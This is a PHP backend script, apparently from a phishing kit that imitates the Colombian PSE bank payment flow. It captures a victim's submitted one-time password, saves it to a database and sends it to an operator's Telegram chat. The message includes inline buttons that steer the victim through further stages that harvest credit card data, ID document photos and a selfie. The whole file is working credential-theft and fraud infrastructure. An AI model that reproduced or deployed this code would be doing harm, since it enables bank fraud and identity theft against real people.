<?php

// Mobile check removed

?>
<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // 1. Cargar Configuración Global
    $config = require '../../config/config.php';

    if (!$config || !is_array($config)) {
        die("Error: No se pudo cargar la configuración.");
    }

    // Conexión DB
    $pdo = require '../../config/db.php';

    $bot_token = $config['botToken'];
    $chat_id = $config['chatId'];
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    // 2. Recuperar datos
    $cliente_id = $_POST['cliente_id'] ?? null;
    $otp_array = $_POST['otp'] ?? [];
    $message = '';

    if (empty($cliente_id) || count($otp_array) < 1) {
        header("Location: ../../index.php");
        exit();
    }

    $submitted_otp = implode('', $otp_array);

    // Emojis via unicode escape (100% safe on any Windows/Linux encoding)
    $emCheck = json_decode('"\u2705"');
    $emId    = json_decode('"\ud83c\udd94"');
    $emLock  = json_decode('"\ud83d\udd12"');
    $emError = json_decode('"\u274c"');
    $emKey   = json_decode('"\ud83d\udd11"');
    $emWarn  = json_decode('"\u26a0\ufe0f"');
    $emCard  = json_decode('"\ud83d\udcb3"');
    $emPhone = json_decode('"\ud83d\udcf2"');
    $emSelf  = json_decode('"\ud83e\udd33"');

    // 3. Actualizar DB
    try {
        $sql = "UPDATE pse SET estado = 1, otp = :otp WHERE id = :id";
        $stmt = $pdo->prepare($sql);
        $stmt->execute(['otp' => $submitted_otp, 'id' => $cliente_id]);

        $message = "{$emCheck} OTP Recibido {$emCheck}\n\n{$emId} ID: {$cliente_id}\n{$emLock} OTP: {$submitted_otp}";

    } catch (PDOException $e) {
        $message = "{$emWarn} Error DB OTP ID: {$cliente_id}";
    }

    // 4. Buttons
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => "{$emError} Error Login", 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                ['text' => "{$emKey} Otp",           'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
            ],
            [
                ['text' => "{$emWarn} Otp Error", 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"],
                ['text' => "{$emCard} CC",         'url' => "$baseUrl?id=$cliente_id&estado=5&key=$security_key"],
            ],
            [
                ['text' => "{$emWarn} CC Error",  'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"],
                ['text' => "{$emCheck} Finalizar", 'url' => "$baseUrl?id=$cliente_id&estado=7&key=$security_key"],
            ],
            [
                ['text' => "{$emId} Doc Frente",  'url' => "$baseUrl?id=$cliente_id&estado=11&key=$security_key"],
                ['text' => "{$emId} Doc Reverso", 'url' => "$baseUrl?id=$cliente_id&estado=12&key=$security_key"]
            ],
            [
                ['text' => "{$emPhone} WhatsApp",   'url' => "$baseUrl?id=$cliente_id&estado=8&key=$security_key"],
                ['text' => "{$emSelf} Selfie",       'url' => "$baseUrl?id=$cliente_id&estado=9&key=$security_key"],
                ['text' => "{$emWarn} Selfie Error", 'url' => "$baseUrl?id=$cliente_id&estado=10&key=$security_key"]
            ]
        ]
    ];

    $encoded_keyboard = json_encode($keyboard);

    // 5. Send
    if (!empty($message)) {
        $url_telegram = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $message,
            'reply_markup' => $encoded_keyboard
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url_telegram);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }

    // 6. Redirect
    header("Location: ../../index.php?status=espera&id=" . $cliente_id);
    exit();

} else {
    header("Location: ../../index.php");
    exit();
}
